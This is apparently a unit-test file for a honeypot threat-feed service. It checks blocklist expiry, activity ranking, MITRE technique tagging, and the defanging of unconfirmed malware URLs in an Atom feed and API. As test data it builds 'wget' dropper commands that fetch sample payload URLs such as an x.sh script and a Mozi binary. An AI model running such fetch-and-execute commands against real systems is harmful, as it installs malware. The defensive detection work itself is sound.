"""The lists stay fresh and say exactly what they know: an attacker leaves at its expiry, the most
active come first, techniques are as fine as the evidence allows, and the Atom feed carries its
indicators without ever leaking an excluded address or an unconfirmed URL in raw form."""
import json
import os
import subprocess
import sys
import tempfile
import time
import unittest

from fastapi.testclient import TestClient

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from uninvited import droppers, intel
from uninvited.app import Hub, build_app
from uninvited.core import Config, Knock
from uninvited.feeds import FeedCache
from uninvited.store import Store

DAY = 86400


class Base(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.mkdtemp()
        self.db = os.path.join(self.dir, "t.db")
        self.store = Store(self.db)
        self.now = int(time.time())

    def tearDown(self):
        self.store.close()

    def login(self, ip, ago, proto="SSH", user="root", password="x"):
        self.store.record(Knock(proto=proto, ip=ip, port=22, ts=self.now - ago, username=user, password=password))

    def deliver(self, source, url, ago=60):
        k = Knock(proto="HTTP", ip=source, port=80, ts=self.now - ago)
        k.detail = {"exploit": "Malware Dropper Command"}
        k.droppers = droppers.extract(f"wget {url}")
        self.store.record(k)

    def build(self, **kw):
        cache = FeedCache(self.db, **kw)
        cache.refresh()
        return cache

    @staticmethod
    def ips(cache, stem):
        return [r["ip"] for r in json.loads(cache.files[f"{stem}.json"].body)["indicators"]]

    def client(self, cache):
        cfg = Config({"database": self.db, "services": [{"proto": "SSH", "port": 22}], "site": {}})
        return TestClient(build_app(cfg, self.store, Hub(cfg, self.store), cache))


class ExpiryTests(Base):
    def test_an_attacker_leaves_every_list_at_its_expiry(self):
        for i in range(3):
            self.login("45.33.32.10", 6 * DAY + i)     # unknown network, low score: 5 days
            self.login("45.33.32.11", 2 * DAY + i)
        cache = self.build()
        for stem in ("attackers-7d", "attackers-30d"):
            self.assertEqual(self.ips(cache, stem), ["45.33.32.11"], stem)
        text = cache.files["attackers-30d.txt"].body.decode()
        self.assertNotIn("45.33.32.10", text)
        self.assertIn("Each leaves 3 to 11 days after its last attack", text)
        self.assertEqual(cache.lookup("45.33.32.10")["listed"], {"24h": False, "7d": False, "30d": False})
        self.assertNotIn("45.33.32.10", cache.blocklist(720, 3))
        why = self.client(cache).get("/api/lookup?ip=45.33.32.10").json()["why_not"]
        self.assertIn("left the list", why)

    def test_every_listed_entry_expires_in_the_future(self):
        for i in range(3):
            self.login("45.33.32.12", 3600 + i)
        cache = self.build()
        now = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        for stem in ("attackers-24h", "attackers-7d", "attackers-30d"):
            for r in json.loads(cache.files[f"{stem}.json"].body)["indicators"]:
                self.assertGreater(r["expires"], now)


class OrderTests(Base):
    def test_a_quiet_strong_host_falls_below_an_active_weaker_one(self):
        # 60 events over three services and four days, last seen four days ago: score 60, kept 8 days.
        for i in range(20):
            for proto in ("SSH", "TNET", "FTP"):
                self.login("45.33.32.20", 4 * DAY + i * 300 + (DAY if i == 0 else 0), proto=proto)
        # 10 events over two services, just now: score 30.
        for i in range(5):
            for proto in ("SSH", "TNET"):
                self.login("45.33.32.21", 60 + i, proto=proto)
        cache = self.build()
        rows = json.loads(cache.files["attackers-30d.json"].body)["indicators"]
        score = {r["ip"]: r["score"] for r in rows}
        self.assertGreater(score["45.33.32.20"], score["45.33.32.21"])
        self.assertEqual([r["ip"] for r in rows], ["45.33.32.21", "45.33.32.20"])
        self.assertIn("most active first", cache.files["attackers-30d.txt"].body.decode())

    def test_the_rank_halves_every_three_quiet_days(self):
        self.assertEqual(intel.rank(80, 0), 80)
        self.assertAlmostEqual(intel.rank(80, 3 * DAY), 40)
        self.assertAlmostEqual(intel.rank(80, 6 * DAY), 20)
        self.assertEqual(intel.rank(None, 0), 0)


class TechniqueTests(Base):
    def test_web_names_map_to_the_scan_they_are(self):
        self.assertEqual(intel.tags({"HTTP": 3}, {"DotEnv File Exposure": 3})[0], ["T1595.003"])
        self.assertEqual(intel.tags({"ROUTER": 3}, {"VPN Appliance Probe": 3})[0], ["T1595.002"])
        self.assertEqual(intel.tags({"HTTP": 3}, {"Git Repository Exposure": 1, "Shell Command Injection": 2})[0],
                         ["T1190", "T1595.003"])
        for name in intel.WORDLIST_HUNTS | intel.PRODUCT_PROBES:
            self.assertNotIn(name, intel.GENERIC_EXPLOITS, name)

    def test_guessing_and_spraying(self):
        self.assertEqual(intel.guessing(1, 40), "T1110.001")
        self.assertEqual(intel.guessing(20, 30), "T1110.001")
        self.assertEqual(intel.guessing(6, 1), "T1110.003")
        self.assertEqual(intel.guessing(3, 1), "T1110.001")     # too few accounts to call it spraying

    def test_one_password_across_many_accounts_is_spraying_end_to_end(self):
        for i, user in enumerate(("root", "admin", "ubuntu", "test", "oracle", "pi")):
            self.login("45.33.32.30", 60 + i, user=user, password="123456")
        for i in range(4):
            self.login("45.33.32.31", 60 + i, user="root", password=f"pw{i}")
        rows = {r["ip"]: r for r in json.loads(self.build().files["attackers-24h.json"].body)["indicators"]}
        self.assertEqual(rows["45.33.32.30"]["attack_techniques"], ["T1110.003"])
        self.assertEqual(rows["45.33.32.31"]["attack_techniques"], ["T1110.001"])

    def test_every_technique_has_a_name_and_a_misp_galaxy_name(self):
        for tid in intel.TECHNIQUES:
            self.assertIn(tid, intel.MISP_ATTACK, tid)
            self.assertTrue(intel.MISP_ATTACK[tid].endswith(" - " + tid), tid)


class NetworkTests(unittest.TestCase):
    def test_the_network_number_decides_before_the_name(self):
        self.assertEqual(intel.host_type("Cyber Internet Services (Pvt) Ltd.", None, 9541), "isp")
        self.assertEqual(intel.host_type("UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED", None, 135377), "hosting")
        self.assertEqual(intel.host_type("Some Name", None, None), "unknown")
        # A customer-line reverse name still wins: a cloud ASN can resell home lines.
        self.assertEqual(intel.host_type("Google LLC", "dynamic-1-2-3-4.pool.example", 15169), "isp")
        self.assertFalse(intel.HOSTING_ASNS & intel.ISP_ASNS)


class AtomTests(Base):
    URL = "http://45.9.148.5/x.sh"

    def atom(self, **kw):
        return self.build(**kw).files["notable.atom"].body.decode()

    def test_an_unconfirmed_url_reaches_the_feed_defanged_with_its_sender(self):
        self.deliver("198.51.100.7", self.URL)
        body = self.atom()
        self.assertIn('<ioc:indicator type="ipv4-addr">198.51.100.7</ioc:indicator>', body)
        self.assertIn("/#ip=198.51.100.7", body)
        self.assertIn("from 198.51.100.7", body)
        self.assertNotIn("45.9.148.5/x", body)                  # the raw URL is not in it anywhere
        self.assertNotIn('type="url"', body)

    def test_a_listed_url_is_carried_raw_for_machines(self):
        self.deliver("198.51.100.7", self.URL, ago=120)
        self.deliver("198.51.100.8", self.URL, ago=60)
        self.assertIn(f'<ioc:indicator type="url">{self.URL}</ioc:indicator>', self.atom())

    def test_an_excluded_address_never_reaches_the_atom_feed(self):
        self.deliver("198.51.100.7", self.URL)
        self.assertNotIn("198.51.100.7", self.atom(exclude=["198.51.100.0/24"]))

    def test_entry_ids_survive_a_restart(self):
        code = ("from uninvited.notables import _sid; print(_sid(('exploit', 'Shellshock (CVE-2014-6271)')), "
                "_sid('http://45.9.148.5/x.sh'))")
        root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        outs = {subprocess.run([sys.executable, "-c", code], cwd=root, capture_output=True, text=True,
                               env={**os.environ, "PYTHONHASHSEED": seed}).stdout for seed in ("1", "2")}
        self.assertEqual(len(outs), 1, outs)


class UnconfirmedTests(Base):
    URL = "http://45.9.148.5/x.sh"

    def test_one_host_shows_on_the_page_only_defanged(self):
        self.deliver("198.51.100.7", self.URL)
        cache = self.build()
        self.assertEqual([(u["url"], u["sent_by"]) for u in cache.unconfirmed],
                         [("hxxp://45[.]9[.]148[.]5/x[.]sh", "198.51.100.7")])
        client = self.client(cache)
        api = client.get("/api/unconfirmed-urls").json()
        self.assertEqual(api["urls"][0]["url"], "hxxp://45[.]9[.]148[.]5/x[.]sh")
        notes = client.get("/api/notables?hours=1").text
        self.assertNotIn(self.URL, notes)
        self.assertNotIn(self.URL, client.get("/api/unconfirmed-urls").text)

    def test_a_second_host_moves_it_to_the_list(self):
        self.deliver("198.51.100.7", self.URL, ago=120)
        self.deliver("198.51.100.8", self.URL, ago=60)
        self.assertEqual(self.build().unconfirmed, [])

    def test_a_host_offering_its_own_copy_is_never_unconfirmed(self):
        self.deliver("175.107.3.233", "http://175.107.3.233:43777/Mozi.a")
        self.assertEqual(self.build().unconfirmed, [])


if __name__ == "__main__":
    unittest.main()
